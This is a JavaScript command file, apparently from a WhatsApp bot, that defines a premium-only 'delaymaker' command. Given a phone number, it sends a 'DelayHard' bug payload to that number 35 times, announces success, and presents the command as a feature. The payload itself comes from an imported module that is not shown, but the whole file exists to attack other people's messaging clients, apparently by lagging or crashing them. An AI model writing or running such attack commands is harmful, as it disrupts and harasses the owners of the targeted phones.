import { sendDelayMaker, requirePhoneTarget, getBugTargetBlockReason, sleep } from "@/src/services/bug/index.js";

export default {
  name: "delaymaker",
  aliases: [],
  description: "Kirim bug DelayHard double-hit ke nomor target (35 iterasi)",
  usage: "628xxx",
  category: "Bug",
  premiumOnly: true,
  run: async (sock, msg, args, { reply, prefix, commandName, isPrimarySuperOwner }) => {
    const q = args.join(" ");
    if (!q) return reply(`*Syntax Eror*\nExample: ${prefix + commandName} 628xxx`);
    let target;
    try {
      target = requirePhoneTarget(q);
    } catch (_) {
      return reply(`*Syntax Eror*\nExample: ${prefix + commandName} 628xxx`);
    }
    const blocked = getBugTargetBlockReason(sock, target, { isPrimarySuperOwner });
    if (blocked) return reply(blocked);
    await reply(`*Success! Send Bug to ${target}*`);
    await sendDelayMaker(sock, target, { loops: 35 });
    await sleep(500);
    console.log("\x1b[31m\x1b[1mSuccess!\x1b[0m");
  },
};
